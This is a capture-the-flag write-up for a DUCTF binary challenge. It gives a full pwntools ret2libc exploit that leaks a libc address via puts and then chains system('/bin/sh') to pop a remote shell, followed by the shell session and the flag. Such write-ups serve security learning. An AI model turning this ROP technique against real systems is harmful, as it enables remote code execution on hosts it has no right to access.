# rot-i

Author: [roerohan](https://github.com/roerohan)

## Source

```
Author: Faith

This will show my friends!

nc chal.duc.tf 30003
```

## Exploit

Ret2libc ROP, but you have to find the libc version online. (I used (libc.rip)[https://libc.rip/])


```py
from pwn import *

local = False

host = 'chal.duc.tf'
port = 30003

elf = ELF('./return-to-what')
rop = ROP(elf)

if local:
    p = elf.process()
    libc = ELF('/usr/lib/libc.so.6')
else:
    p = remote(host, port)
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

OFFSET = b'A' * (0x30 + 0x8)

log.info("puts@plt: " + hex(PUTS_PLT))
log.info("main@plt: " + hex(MAIN_PLT))
log.info("POP RDI: " + hex(POP_RDI))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    rop_chain = [
        POP_RDI, FUNC_GOT,
        PUTS_PLT,
        MAIN_PLT,
    ]

    rop_chain = b''.join([p64(i) for i in rop_chain])
    payload = OFFSET + rop_chain
    
    print(p.clean())
    print(payload)

    p.sendline(payload)

    received = p.recvline().strip()
    leak = u64(received.ljust(8, b'\x00'))
    libc.address = leak - libc.symbols[func_name]

    return hex(leak)

log.info('Leak: ' + get_addr('puts'))
log.info('Libc base: ' + hex(libc.address))

BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']
EXIT = libc.symbols['exit']

ROP_CHAIN = [
    RET,
    POP_RDI, BIN_SH,
    SYSTEM,
    EXIT,
]

ROP_CHAIN = b''.join([p64(i) for i in ROP_CHAIN])

payload = OFFSET + ROP_CHAIN

print(p.clean())
print(payload)

p.sendline(payload)

p.interactive()
```

You get a shell.

```bash
[*] Switching to interactive mode
$ ls
flag.txt
return-to-what
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
```

The flag is:

```
DUCTF{ret_pUts_ret_main_ret_where???}
```